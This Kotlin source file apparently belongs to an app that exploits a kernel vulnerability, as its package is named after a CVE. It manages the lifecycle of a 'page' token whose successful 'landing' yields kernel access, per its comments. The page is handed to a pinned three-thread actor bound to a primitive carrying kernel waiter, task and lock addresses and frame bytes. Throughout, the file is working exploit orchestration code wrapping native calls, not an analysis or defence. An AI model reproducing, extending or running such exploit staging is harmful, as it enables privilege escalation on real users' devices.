package com.ghostlock.app.backend.cve43499.owned

import com.ghostlock.app.jni.Native43499ActorPrepareResult
import com.ghostlock.app.jni.Native43499ActorSetup
import com.ghostlock.app.jni.Native43499CloseResult
import com.ghostlock.app.jni.Native43499Jni
import com.ghostlock.app.jni.Native43499PrimitiveSpec

/**
 * `prepareActor` 的 Kotlin 侧参数：Actor 调度 + 已绑定的 Carrier。
 *
 * @property setup 三 worker 的 CPU/优先级/有界等待。
 * @property primitive 选中 Carrier 的最终地址与 frame 字节；JNI 会在进入 Native
 *   事务前深拷贝，Native 在线程创建前再深拷贝一次并完成 dispatch。
 * @note 一个 [Native43499ActorSetup] 只能用于一次 prepareActor；本对象不缓存。
 */
internal data class ActorPreparation(
    val setup: Native43499ActorSetup,
    val primitive: Native43499PrimitiveSpec,
)

/**
 * `prepareActor` 的具名结局；token 语义在内部已按 receipt 结算。
 *
 * @note [CleanFailure]/[NotAccepted] 时 Page token 已恢复，Page owner 仍可重试或 close。
 */
internal sealed interface ActorPrepareOutcome {
    /** 成功：Page 已消费，Actor 是唯一 owner。 */
    data class Prepared(
        val owner: ActorOwner,
        val receipt: Native43499ActorPrepareResult,
    ) : ActorPrepareOutcome

    /** 提交前 clean failure：Page 未被消费，token 已恢复。 */
    data class CleanFailure(
        val receipt: Native43499ActorPrepareResult,
    ) : ActorPrepareOutcome

    /** dirty/indeterminate：Page 已消费，Native 保留整链到进程退出。 */
    data class ConsumedDirty(
        val receipt: Native43499ActorPrepareResult,
        val reason: String = "prepare-actor-dirty",
    ) : ActorPrepareOutcome

    /** JNI 已调用 core 但回执不完整：fail-stop，**不恢复 Page token**（consumed 未知）。 */
    data class ReceiptIncomplete(
        val reason: String = "prepare-actor-receipt-incomplete",
    ) : ActorPrepareOutcome

    /** JNI 前置拒绝（未调用 core）：Page token 已恢复。 */
    data object NotAccepted : ActorPrepareOutcome

    /** wrapper 本地拒绝（未触 Native 或参数不满足物理常量）。 */
    data class Rejected(val reason: String) : ActorPrepareOutcome
}

/**
 * Page 的唯一 Kotlin owner：Page 独占 landing 成功时建立的内核访问闭包。
 *
 * @param contentGeneration landing 时 Kotlin 给出的生成号（Native 原样回传）。
 * @param pageBase landing 的候选页基址事实。
 * @note 阶段：G4L-5；只由 [PlacementOwner.landPage] 创建，经 [prepareActor] 转移给
 *   [ActorOwner]；未转移前可用 [closeDetailed] 终结。
 * @note `closePage` 只接收尚未转给 Actor 的 Page；转移后调用是本地拒绝。
 */
internal class PageOwner private constructor(
    private val contentGeneration: Long,
    private val pageBase: Long,
) : TokenOwner(OwnerKind.PAGE) {
    /** @return landing 时 Kotlin 给出的 content_generation 事实。 */
    internal val landingContentGeneration: Long get() = contentGeneration

    /** @return landing 的候选页基址事实。 */
    internal val landingPageBase: Long get() = pageBase

    /**
     * 消费本 Page，创建 Actor 并绑定 Carrier。
     *
     * @param preparation Actor 调度与 Carrier 参数。
     * @return 具名结局；token 结算先于返回完成。
     * @note 入口顺序：输出 ABI（JNI 内部）→ 本地物理预检 → 原子取 token →
     *       JNI prepareActor → 按 receipt.pageConsumed 结算。
     * @note 只有 Native 未写回输出时恢复 token；其余按 receipt。
     * @note 阶段：G4L-5 / Page → Actor 的唯一次转移。
     */
    internal fun prepareActor(preparation: ActorPreparation): ActorPrepareOutcome =
        guarded {
            if (lifecycleLocked() != Lifecycle.OPEN || tokenLocked() == 0L) {
                return@guarded ActorPrepareOutcome.Rejected("page-not-open:" + describe())
            }
            val precheck = precheckPreparation(preparation)
            if (precheck != null) return@guarded ActorPrepareOutcome.Rejected(precheck)

            val taken = takeTokenLocked()
            val receipt = Native43499ActorPrepareResult()
            val actorToken = Native43499Jni.prepareActor(
                taken,
                preparation.setup,
                preparation.primitive,
                receipt,
            )
            when (classifyHandleStatus(actorToken)) {
                NativeCallState.NOT_ACCEPTED -> {
                    /* JNI 未调用 core：Page token 未被消费，必须恢复。 */
                    return@guarded if (restoreTokenLocked(taken)) {
                        ActorPrepareOutcome.NotAccepted
                    } else {
                        markTransferredLocked()
                        ActorPrepareOutcome.ConsumedDirty(
                            receipt,
                            "prepare-actor-not-accepted-token-lost",
                        )
                    }
                }
                NativeCallState.RECEIPT_INCOMPLETE -> {
                    /* fail-stop：core 可能已消费 Page，不恢复、不 close。 */
                    markTransferredLocked()
                    return@guarded ActorPrepareOutcome.ReceiptIncomplete()
                }
                NativeCallState.ACCEPTED -> Unit
            }
            if (actorToken != 0L) {
                markTransferredLocked()
                val owner = ActorOwner.adopt(
                    token = actorToken,
                    pageContentGeneration = receipt.pageContentGeneration,
                    primitiveKind = receipt.primitiveKind,
                )
                if (owner == null) {
                    val closeReceipt = Native43499CloseResult()
                    Native43499Jni.closeActor(actorToken, closeReceipt)
                    return@guarded ActorPrepareOutcome.ConsumedDirty(
                        receipt,
                        "prepare-actor-adopt-failed",
                    )
                }
                return@guarded ActorPrepareOutcome.Prepared(owner, receipt)
            }
            if (receipt.pageConsumed) {
                markTransferredLocked()
                return@guarded ActorPrepareOutcome.ConsumedDirty(
                    receipt,
                    "prepare-actor-" + Native43499CallStatus.name(receipt.callStatus),
                )
            }
            return@guarded if (restoreTokenLocked(taken)) {
                ActorPrepareOutcome.CleanFailure(receipt)
            } else {
                markTransferredLocked()
                ActorPrepareOutcome.ConsumedDirty(receipt, "prepare-actor-restore-failed")
            }
        }

    /**
     * 终结尚未转移给 Actor 的 Page；接受后消费 token。
     *
     * @return 具名结局；已转移调用是本地拒绝，不触 Native。
     * @note 阶段：G4L-5 终结。
     */
    internal override fun closeDetailed(): OwnerCloseOutcome = guarded {
        if (lifecycleLocked() != Lifecycle.OPEN || tokenLocked() == 0L) {
            return@guarded OwnerCloseOutcome.Rejected("page-not-open:" + describe())
        }
        TokenOwner.settleClose(this) { handle, receipt: Native43499CloseResult ->
            Native43499Jni.closePage(handle, receipt)
        }
    }

    /**
     * 本地预检 prepareActor 参数；Native 仍会做同一组校验。
     *
     * @param preparation 待校验参数。
     * @return null 表示通过；否则为具名 reason。
     */
    private fun precheckPreparation(preparation: ActorPreparation): String? {
        val setup = preparation.setup
        if (setup.threadCount != 3) return "actor-thread-count:" + setup.threadCount
        if (setup.ownerCpu < 0 || setup.waiterCpu < 0 || setup.consumerCpu < 0) {
            return "actor-cpu"
        }
        val priorities = listOf(
            setup.ownerPriority,
            setup.waiterPriority,
            setup.consumerPriority,
        )
        if (priorities.any { it !in -20..19 }) return "actor-priority"
        if (setup.prepareTimeoutNanos <= 0L || setup.parkedTimeoutNanos <= 0L ||
            setup.executionTimeoutNanos <= 0L || setup.shutdownTimeoutNanos <= 0L
        ) {
            return "actor-timeout-nanos"
        }
        val primitive = preparation.primitive
        if (primitive.finalWaiterAddress == 0L ||
            primitive.finalTaskAddress == 0L ||
            primitive.finalLockAddress == 0L
        ) {
            return "actor-primitive-addresses"
        }
        if (primitive.frameBytes.isEmpty()) return "actor-primitive-frame"
        return null
    }

    companion object {
        /**
         * 从 landing 回执收养一个 Page token（只由 [PlacementOwner.landPage] 调用）。
         *
         * @param token Native 返回的非零 Page token。
         * @param contentGeneration landing 回执里的 content_generation。
         * @param pageBase landing 回执里的 actual_page_base。
         * @param placementConsumed landing 回执里的 placement_consumed（事实记录）。
         * @return 新 owner；token 为 0 或安装失败时返回 null（调用方负责 close）。
         */
        internal fun adopt(
            token: Long,
            contentGeneration: Long,
            pageBase: Long,
            placementConsumed: Boolean,
        ): PageOwner? {
            if (token == 0L || !placementConsumed) return null
            val owner = PageOwner(contentGeneration, pageBase)
            return if (owner.adoptToken(token)) owner else null
        }
    }
}
